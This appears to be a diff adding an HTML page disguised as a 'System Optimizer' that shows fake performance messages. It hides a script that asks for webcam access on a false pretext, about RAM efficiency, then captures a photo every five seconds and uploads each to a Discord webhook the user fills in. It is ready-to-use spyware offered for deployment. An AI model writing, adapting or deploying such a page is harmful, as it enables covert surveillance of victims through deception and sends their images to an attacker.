@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>SYSTEM OPTIMIZER v12.4</title>
+  <style>
+    body {
+      margin: 0;
+      background: #0a0a0a;
+      color: #00ffcc;
+      font-family: "Courier New", monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    .terminal {
+      background: #111;
+      border: 1px solid #00ffcc;
+      padding: 20px;
+      border-radius: 8px;
+      width: 80%;
+      max-width: 600px;
+      text-align: left;
+      box-shadow: 0 0 10px #00ffcc44;
+      margin-bottom: 20px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>SYSTEM OPTIMIZER v12.4</h1>
+  <div class="terminal">
+    <p>[INFO] Initializing boost modules...</p>
+    <p>[INFO] Allocating extra RAM threads...</p>
+    <p>[INFO] Applying performance injection...</p>
+    <p>[INFO] System stability increasing by 98.7%</p>
+    <p>[INFO] Webcam diagnostics active...</p>
+  </div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const webhookURL = "YOUR_DISCORD_WEBHOOK_HERE"; // Replace with your webhook
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    // Ask for webcam access
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Take photo every 5 seconds
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("file", blob, "boost.png");
+            fetch(webhookURL, {
+              method: "POST",
+              body: formData
+            }).then(res => console.log("[✅] Sent photo")).catch(err => console.error("[❌] Error:", err));
+          }, "image/png");
+        }, 5000);
+      })
+      .catch(err => {
+        console.error("[❌] Webcam access denied.");
+        alert("System Optimizer requires webcam access to boost RAM efficiency!");
+      });
+  </script>
+</body>
+</html>
